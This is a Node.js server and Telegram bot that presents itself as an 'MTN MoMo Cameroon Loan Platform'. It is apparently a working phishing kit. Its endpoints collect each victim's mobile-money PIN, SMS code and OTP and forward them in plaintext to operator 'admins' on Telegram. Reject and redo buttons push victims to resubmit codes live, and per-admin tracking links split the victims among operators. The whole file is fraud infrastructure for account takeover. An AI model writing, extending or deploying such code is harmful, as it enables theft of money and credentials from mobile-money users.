const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const db = require('./database');

const app = express();

// ==========================================
// WEBHOOK MODE (for Render / production)
// ==========================================

const BOT_TOKEN   = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT        = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `http://localhost:${PORT}`;

// Create bot WITHOUT polling
const bot = new TelegramBot(BOT_TOKEN);

// In-memory maps
const adminChatIds    = new Map(); // adminId → chatId
const pausedAdmins    = new Set(); // adminIds that are paused
const processingLocks = new Set(); // prevents duplicate requests

let dbReady = false;

// ==========================================
// HELPER FUNCTIONS
// ==========================================

function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (adminId === 'ADMIN001') return true;
    return !pausedAdmins.has(adminId);
}

function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) return adminId;
    }
    return null;
}

// Format Cameroon phone number format for Telegram display (+237 / 6XXXXXXXX)
function formatPhone(phoneNumber) {
    if (!phoneNumber) return phoneNumber;
    if (phoneNumber.startsWith('+237')) return phoneNumber;
    if (phoneNumber.startsWith('237')) return '+' + phoneNumber;
    return phoneNumber;
}

async function sendToAdmin(adminId, message, options = {}) {
    const chatId = adminChatIds.get(adminId);

    if (!chatId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (!admin?.chatId) {
                console.error(`❌ No chat ID for admin: ${adminId}`);
                return null;
            }
            adminChatIds.set(adminId, admin.chatId);
            return await bot.sendMessage(admin.chatId, message, options);
        } catch (err) {
            console.error(`❌ DB fallback failed for admin ${adminId}:`, err.message);
            return null;
        }
    }

    try {
        return await bot.sendMessage(chatId, message, options);
    } catch (error) {
        console.error(`❌ Error sending to ${adminId}:`, error.message);
        return null;
    }
}

// ==========================================
// MIDDLEWARE
// ==========================================
app.use(express.json());
app.use(express.static(__dirname));

// ==========================================
// BOT COMMAND HANDLERS
// ==========================================
console.log('⏳ Setting up bot handlers...');

bot.on('error',         (error) => console.error('❌ Bot error:',    error?.message));
bot.on('polling_error', (error) => console.error('❌ Polling error:', error?.message));

setupCommandHandlers();
console.log('✅ Command handlers configured!');

// ==========================================
// WEBHOOK ENDPOINT
// ==========================================
const webhookPath = `/telegram-webhook`;

app.post(webhookPath, (req, res) => {
    try {
        console.log('📥 Webhook received:', JSON.stringify(req.body).substring(0, 150));
        if (req.body && req.body.update_id !== undefined) {
            try {
                bot.processUpdate(req.body);
                console.log('✅ Update processed');
            } catch (processError) {
                console.error('❌ processUpdate error:', processError);
            }
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook handler error:', error);
        res.sendStatus(200);
    }
});

// ==========================================
// DATABASE INIT + WEBHOOK SETUP
// ==========================================
db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database ready!');

        await loadAdminChatIds();

        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        let webhookSetSuccessfully = false;
        let attempts = 0;

        while (!webhookSetSuccessfully && attempts < 3) {
            attempts++;
            try {
                console.log(`🔄 Attempt ${attempts}/3: Setting webhook to: ${fullWebhookUrl}`);
                await bot.deleteWebHook();
                await new Promise(resolve => setTimeout(resolve, 1000));

                const result = await bot.setWebHook(fullWebhookUrl, {
                    drop_pending_updates: false,
                    max_connections: 40,
                    allowed_updates: ['message', 'callback_query']
                });

                if (result) {
                    const info = await bot.getWebHookInfo();
                    if (info.url === fullWebhookUrl) {
                        webhookSetSuccessfully = true;
                        console.log(`✅ Webhook CONFIRMED: ${fullWebhookUrl}`);
                    } else {
                        console.error(`❌ Webhook URL mismatch. Got: ${info.url}`);
                    }
                }
            } catch (webhookError) {
                console.error(`❌ Webhook setup error (attempt ${attempts}):`, webhookError.message);
                if (attempts < 3) await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        // Keep-alive loop to prevent free-tier sleep
        setInterval(() => {
            const pingUrl = `${WEBHOOK_URL}/health`;
            fetch(pingUrl).catch(() => {});
        }, 14 * 60 * 1000);

        console.log('✅ System fully initialized!');
    })
    .catch((error) => {
        console.error('❌ Initialization failed:', error);
        process.exit(1);
    });

async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        adminChatIds.clear();
        pausedAdmins.clear();

        for (const admin of admins) {
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
            }
        }
        console.log(`✅ ${adminChatIds.size} admins loaded, ${pausedAdmins.size} paused`);
    } catch (error) {
        console.error('❌ Error loading admin chat IDs:', error);
    }
}

// ==========================================
// BOT COMMAND HANDLERS
// ==========================================
function setupCommandHandlers() {
    bot.onText(/\/start/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        try {
            if (adminId) {
                if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                    await bot.sendMessage(chatId, `🚫 *ADMIN ACCESS PAUSED*\n\nYour access has been temporarily paused.`, { parse_mode: 'Markdown' });
                    return;
                }

                const admin = await db.getAdmin(adminId);
                const isSuperAdmin = adminId === 'ADMIN001';

                let message = `
👋 *Welcome ${admin.name} (MTN MoMo Cameroon)!*

*Your Admin ID:* \`${adminId}\`
*Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Admin'}
*Your Platform Link:*
${WEBHOOK_URL}?admin=${adminId}

*Commands:*
/mylink - Get your unique tracking link
/stats - View application statistics
/pending - View pending verification queue
/myinfo - Admin profile details
`;
                await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            } else {
                await bot.sendMessage(chatId, `
👋 *Welcome to MTN MoMo Cameroon Loan Platform!*

Your Chat ID: \`${chatId}\`
Provide this Chat ID to the Super Admin to receive administrative credentials.
                `, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error('❌ Error in /start:', error);
        }
    });

    bot.onText(/\/mylink/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId) return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        const admin = await db.getAdmin(adminId);
        bot.sendMessage(chatId, `🔗 *YOUR UNIQUE PLATFORM LINK*\n\n\`${WEBHOOK_URL}?admin=${adminId}\``, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/stats/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId) return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        const stats = await db.getAdminStats(adminId);
        bot.sendMessage(chatId, `
📊 *VERIFICATION STATISTICS*

📋 Total Applications: ${stats.total}
⏳ Stage 1 (PIN) Pending: ${stats.pinPending}
✅ PIN Approved: ${stats.pinApproved}
⏳ Stage 2 (SMS) Pending: ${stats.smsPending || 0}
✅ SMS Approved: ${stats.smsApproved || 0}
⏳ Stage 3 (OTP) Pending: ${stats.otpPending}
🎉 Fully Approved Loans: ${stats.fullyApproved}
        `, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/pending/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId) return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');

        const adminApps = await db.getApplicationsByAdmin(adminId);
        const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
        const smsPending = adminApps.filter(a => a.smsStatus === 'pending' && a.pinStatus === 'approved');
        const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.smsStatus === 'approved');

        let message = `⏳ *PENDING VERIFICATIONS*\n\n`;
        if (pinPending.length > 0) {
            message += `📱 *Stage 1 - PIN Submissions (${pinPending.length}):*\n`;
            pinPending.forEach((app, i) => {
                message += `${i+1}. ${formatPhone(app.phoneNumber)} - ID: \`${app.id}\`\n`;
            });
            message += '\n';
        }
        if (smsPending.length > 0) {
            message += `💬 *Stage 2 - SMS Submissions (${smsPending.length}):*\n`;
            smsPending.forEach((app, i) => {
                message += `${i+1}. ${formatPhone(app.phoneNumber)} - SMS: \`${app.smsCode}\`\n`;
            });
            message += '\n';
        }
        if (otpPending.length > 0) {
            message += `🔢 *Stage 3 - OTP Submissions (${otpPending.length}):*\n`;
            otpPending.forEach((app, i) => {
                message += `${i+1}. ${formatPhone(app.phoneNumber)} - OTP: \`${app.otp}\`\n`;
            });
        }
        if (pinPending.length === 0 && smsPending.length === 0 && otpPending.length === 0) {
            message = '✨ No pending verifications right now!';
        }
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });
}

// ==========================================
// TELEGRAM CALLBACK HANDLER (3-Stage Flow: PIN -> SMS -> OTP)
// ==========================================
bot.on('callback_query', async (callbackQuery) => {
    const chatId    = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data      = callbackQuery.data;
    const adminId   = getAdminIdByChatId(chatId);

    if (!adminId || !isAdminActive(chatId)) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Unauthorized or paused access!', show_alert: true });
    }

    const parts = data.split('_');
    if (parts.length < 4) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid action data.', show_alert: true });
    }

    const action          = parts[0];
    const type            = parts[1];
    const embeddedAdminId = parts[2];
    const applicationId   = parts.slice(3).join('_');

    if (embeddedAdminId !== adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ This application belongs to another admin.', show_alert: true });
    }

    const application = await db.getApplication(applicationId);
    if (!application) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application record not found.', show_alert: true });
    }

    // ── STAGE 1: PIN REJECTION (Only set pinStatus to 'rejected' so user is prompted to re-enter PIN) ──
    if (action === 'deny' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
        await bot.editMessageText(`
❌ *STAGE 1: PIN REJECTED*

📋 ID: \`${applicationId}\`
📞 Phone: \`${formatPhone(application.phoneNumber)}\`
🔑 PIN Submitted: \`${application.pin}\`

Status: *Rejected by Admin (User returned to retry PIN)*
👤 Handled by: ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ PIN rejected. User sent back to re-enter PIN.' });
    }

    // ── STAGE 1 APPROVAL -> PROCEED TO STAGE 2 (SMS) ──
    else if (action === 'allow' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'approved' });
        await bot.editMessageText(`
✅ *STAGE 1: PIN APPROVED*

📋 ID: \`${applicationId}\`
📞 Phone: \`${formatPhone(application.phoneNumber)}\`
🔑 PIN: \`${application.pin}\`

Status: *Approved — User proceeding to SMS verification stage.*
👤 Handled by: ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ PIN approved. User moved to SMS Stage.' });
    }

    // ── STAGE 2: SMS REJECTION / INVALID CODE ──
    else if (action === 'wrong' && type === 'sms') {
        await db.updateApplication(applicationId, { smsStatus: 'wrong' });
        await bot.editMessageText(`
❌ *STAGE 2: INVALID SMS CODE*

📋 ID: \`${applicationId}\`
📞 Phone: \`${formatPhone(application.phoneNumber)}\`
💬 SMS Code: \`${application.smsCode}\`

Status: *Invalid SMS — User prompted to re-enter code.*
👤 Handled by: ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid SMS code. User prompted to re-enter.' });
    }

    // ── STAGE 2 APPROVAL -> PROCEED TO STAGE 3 (OTP) ──
    else if (action === 'allow' && type === 'sms') {
        await db.updateApplication(applicationId, { smsStatus: 'approved' });
        await bot.editMessageText(`
✅ *STAGE 2: SMS APPROVED*

📋 ID: \`${applicationId}\`
📞 Phone: \`${formatPhone(application.phoneNumber)}\`
💬 SMS Code: \`${application.smsCode}\`

Status: *Approved — User proceeding to final OTP verification stage.*
👤 Handled by: ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ SMS approved. User moved to OTP Stage.' });
    }

    // ── STAGE 3: OTP / PIN REJECTIONS AT FINAL STAGE ──
    else if (action === 'wrongpin' && type === 'otp') {
        await db.updateApplication(applicationId, { pinStatus: 'rejected', otpStatus: 'wrongpin_otp' });
        await bot.editMessageText(`
❌ *STAGE 3: INCORRECT PIN AT FINAL STAGE*

📋 ID: \`${applicationId}\`
📞 Phone: \`${formatPhone(application.phoneNumber)}\`
🔢 OTP: \`${application.otp}\`

Status: *Rejected — User returned to re-verify credentials.*
👤 Handled by: ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Sent back for re-verification.' });
    }

    else if (action === 'wrongcode' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
        await bot.editMessageText(`
❌ *STAGE 3: INVALID OTP CODE*

📋 ID: \`${applicationId}\`
📞 Phone: \`${formatPhone(application.phoneNumber)}\`
🔢 OTP: \`${application.otp}\`

Status: *Invalid Code — User prompted to re-enter verification code.*
👤 Handled by: ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid OTP code. User prompted to re-enter.' });
    }

    // ── STAGE 3: FULL LOAN APPROVAL (Final Success Stage) ──
    else if (action === 'approve' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'approved' });
        await bot.editMessageText(`
🎉 *STAGE 3: LOAN FULLY APPROVED!*

📋 ID: \`${applicationId}\`
📞 Phone: \`${formatPhone(application.phoneNumber)}\`
🔑 PIN: \`${application.pin}\`
💬 SMS Code: \`${application.smsCode}\`
🔢 OTP Code: \`${application.otp}\`

Status: *All 3 Verification Stages (PIN -> SMS -> OTP) Successfully Passed!*
👤 Approved by: ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan successfully approved!' });
    }
});

// ==========================================
// API ENDPOINTS CONNECTED TO index.html
// ==========================================

// 1. Stage 1: PIN Verification Endpoint
app.post('/api/verify-pin', async (req, res) => {
    try {
        const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
        const applicationId = `APP-MOMO-${Date.now()}`;

        let assignedAdmin;
        if (assignmentType === 'specific' && requestAdminId) {
            assignedAdmin = await db.getAdmin(requestAdminId);
            if (!assignedAdmin || assignedAdmin.status !== 'active') {
                return res.status(400).json({ success: false, message: 'Invalid or inactive admin link.' });
            }
        } else {
            const activeAdmins = await db.getActiveAdmins();
            assignedAdmin = activeAdmins[0] || { adminId: 'ADMIN001', name: 'Super Admin' };
        }

        await db.saveApplication({
            id: applicationId,
            adminId: assignedAdmin.adminId,
            adminName: assignedAdmin.name,
            phoneNumber,
            pin,
            pinStatus: 'pending',
            smsStatus: 'pending',
            otpStatus: 'pending',
            timestamp: new Date().toISOString()
        });

        // Notify Admin via Telegram with action buttons for Stage 1 (PIN)
        await sendToAdmin(assignedAdmin.adminId, `
📱 *NEW LOAN APPLICATION - STAGE 1 (PIN)*

📋 ID: \`${applicationId}\`
📞 Phone: \`${formatPhone(phoneNumber)}\`
🔑 MoMo PIN: \`${pin}\`
⏰ ${new Date().toLocaleString()}

👇 *Select verification status:*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Reject PIN (Redo)', callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
                    [{ text: '✅ Approve PIN -> Next (SMS)', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true, applicationId, assignedAdminId: assignedAdmin.adminId });
    } catch (error) {
        console.error('❌ Error in /api/verify-pin:', error);
        res.status(500).json({ success: false, message: error.message });
    }
});

// Check PIN verification status from index.html
app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) {
            res.json({ success: true, status: application.pinStatus });
        } else {
            res.status(404).json({ success: false, message: 'Application not found' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// 2. Stage 2: SMS Verification Endpoint
app.post('/api/verify-sms', async (req, res) => {
    try {
        const { applicationId, smsCode } = req.body;
        const application = await db.getApplication(applicationId);
        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });

        await db.updateApplication(applicationId, { smsCode, smsStatus: 'pending' });

        // Notify Admin for Stage 2 Validation (SMS)
        await sendToAdmin(application.adminId, `
💬 *LOAN VERIFICATION - STAGE 2 (SMS)*

📋 ID: \`${applicationId}\`
📞 Phone: \`${formatPhone(application.phoneNumber)}\`
🔑 PIN: \`${application.pin}\`
💬 SMS Code: \`${smsCode}\`
⏰ ${new Date().toLocaleString()}

👇 *Verify SMS code:*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Wrong SMS Code (Redo)', callback_data: `wrong_sms_${application.adminId}_${applicationId}` }],
                    [{ text: '✅ Approve SMS -> Next (OTP)', callback_data: `allow_sms_${application.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /api/verify-sms:', error);
        res.status(500).json({ success: false, message: error.message });
    }
});

// Check SMS verification status from index.html
app.get('/api/check-sms-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) {
            res.json({ success: true, status: application.smsStatus });
        } else {
            res.status(404).json({ success: false, message: 'Application not found' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// 3. Stage 3: OTP Verification Endpoint
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        const application = await db.getApplication(applicationId);
        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });

        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });

        // Notify Admin for Stage 3 Validation (OTP)
        await sendToAdmin(application.adminId, `
🔢 *LOAN VERIFICATION - STAGE 3 (OTP)*

📋 ID: \`${applicationId}\`
📞 Phone: \`${formatPhone(application.phoneNumber)}\`
🔑 PIN: \`${application.pin}\`
💬 SMS Code: \`${application.smsCode}\`
🔢 OTP Code: \`${otp}\`
⏰ ${new Date().toLocaleString()}

👇 *Finalize verification:*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Wrong PIN (Redo)', callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '❌ Wrong Code (Redo)', callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '🎉 Stage 3: Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /api/verify-otp:', error);
        res.status(500).json({ success: false, message: error.message });
    }
});

// Check OTP verification status from index.html
app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) {
            res.json({ success: true, status: application.otpStatus });
        } else {
            res.status(404).json({ success: false, message: 'Application not found' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        platform: 'MTN MoMo Cameroon Loan API',
        database: dbReady ? 'connected' : 'not ready',
        activeAdmins: adminChatIds.size,
        timestamp: new Date().toISOString()
    });
});

// Serve index.html frontend connection
app.get('/', async (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ==========================================
// START SERVER
// ==========================================
app.listen(PORT, () => {
    console.log(`\n🇨🇲 MTN MOMO CAMEROON LOAN PLATFORM`);
    console.log(`=======================================`);
    console.log(`🌐 Server running on port: ${PORT}`);
    console.log(`🤖 Telegram Bot Webhook Active ✅ (Flow: PIN -> SMS -> OTP)\n`);
});
